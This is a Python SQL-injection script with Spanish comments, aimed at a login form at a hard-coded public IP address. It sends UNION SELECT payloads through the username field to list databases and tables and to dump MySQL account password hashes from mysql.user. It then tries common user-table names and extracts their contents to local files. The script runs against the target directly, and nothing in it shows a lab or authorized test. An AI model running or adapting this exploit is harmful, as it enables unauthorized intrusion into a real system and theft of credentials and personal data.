import requests
import urllib3
import html
import re  # ¡Faltaba este import!

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class MySQLDataExtractor:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def extract_database_info(self):
        """Extrae información de la base de datos MySQL"""
        print("[*] Extrayendo información de MySQL...")
        
        # Payloads para extraer información del sistema
        info_payloads = [
            # Información de la base de datos actual
            {"xUsuario": "admin' UNION SELECT database(),version(),user()--", "xContrasena": "x"},
            
            # Lista de bases de datos
            {"xUsuario": "admin' UNION SELECT schema_name,2,3 FROM information_schema.schemata--", "xContrasena": "x"},
            
            # Tablas de la base de datos actual
            {"xUsuario": "admin' UNION SELECT table_name,table_schema,3 FROM information_schema.tables WHERE table_schema=database()--", "xContrasena": "x"},
            
            # Usuarios de MySQL
            {"xUsuario": "admin' UNION SELECT user,host,authentication_string FROM mysql.user--", "xContrasena": "x"},
        ]
        
        for i, payload in enumerate(info_payloads):
            try:
                form_data = {
                    'yAccion': 'login',
                    'yIntentos': '1', 
                    'yUsuario': '',
                    'xUsuario': payload['xUsuario'],
                    'xContrasena': payload['xContrasena']
                }
                
                print(f"\n[*] Payload {i+1}: {payload['xUsuario'][:80]}...")
                
                response = self.session.post(self.base_url, data=form_data, timeout=15)
                
                # Extraer datos de la respuesta
                self.parse_mysql_response(response.text, f"mysql_info_{i+1}")
                
            except Exception as e:
                print(f"[-] Error: {e}")

    def parse_mysql_response(self, response_text, filename):
        """Parsea la respuesta para extraer datos MySQL"""
        # Buscar patrones de datos en la respuesta
        patterns = [
            r'<td[^>]*>([^<]+)</td>',
            r'<input[^>]*value="([^"]+)"',
            r'<span[^>]*>([^<]+)</span>',
            r'<div[^>]*>([^<]+)</div>',
            r'<option[^>]*>([^<]+)</option>',
            r'<label[^>]*>([^<]+)</label>'
        ]
        
        found_data = []
        
        for pattern in patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            for match in matches:
                # Filtrar datos interesantes
                clean_match = html.unescape(match).strip()
                if (len(clean_match) > 2 and 
                    not clean_match.startswith(('{', '[', '<')) and
                    not any(char in clean_match for char in ['{', '}', '[', ']', '()'])):
                    found_data.append(clean_match)
        
        if found_data:
            print(f"[!] Datos encontrados ({len(found_data)}):")
            unique_data = list(set(found_data))
            for data in unique_data[:15]:  # Mostrar primeros 15 únicos
                if any(keyword in data.lower() for keyword in 
                      ['mysql', 'database', 'schema', 'table', 'user', 'root', 'localhost', 'select', 'insert']):
                    print(f"    *** {data}")
                else:
                    print(f"    - {data}")
            
            # Guardar respuesta completa
            with open(f"{filename}.html", "w", encoding="utf-8") as f:
                f.write(response_text)
            print(f"[+] Respuesta guardada en {filename}.html")
        else:
            print("[-] No se encontraron datos visibles en la respuesta")

    def extract_table_data(self, table_name):
        """Extrae datos de una tabla específica"""
        print(f"\n[*] Extrayendo datos de la tabla: {table_name}")
        
        # Primero obtener columnas
        column_payload = f"admin' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='{table_name}' AND table_schema=database()--"
        
        form_data = {
            'yAccion': 'login',
            'yIntentos': '1',
            'yUsuario': '',
            'xUsuario': column_payload,
            'xContrasena': 'x'
        }
        
        try:
            response = self.session.post(self.base_url, data=form_data, timeout=15)
            
            # Extraer nombres de columnas
            columns = re.findall(r'<td[^>]*>([^<]+)</td>', response.text)
            if columns:
                print(f"[+] Columnas encontradas: {columns}")
                
                # Extraer datos de la tabla
                data_payload = f"admin' UNION SELECT GROUP_CONCAT({','.join(columns)}),2,3 FROM {table_name}--"
                form_data['xUsuario'] = data_payload
                
                data_response = self.session.post(self.base_url, data=form_data, timeout=15)
                self.parse_mysql_response(data_response.text, f"table_{table_name}")
            else:
                print(f"[-] No se encontraron columnas para la tabla {table_name}")
                
        except Exception as e:
            print(f"[-] Error extrayendo tabla {table_name}: {e}")

# Ejecutar extracción MySQL CORREGIDA
print("=== EXTRACCIÓN MYSQL CORREGIDA ===")
mysql_extractor = MySQLDataExtractor("189.254.143.102")
mysql_extractor.extract_database_info()

# Intentar extraer tablas comunes
common_tables = ['users', 'usuarios', 'admin', 'administradores', 'login', 'user', 'usuario']
for table in common_tables:
    mysql_extractor.extract_table_data(table)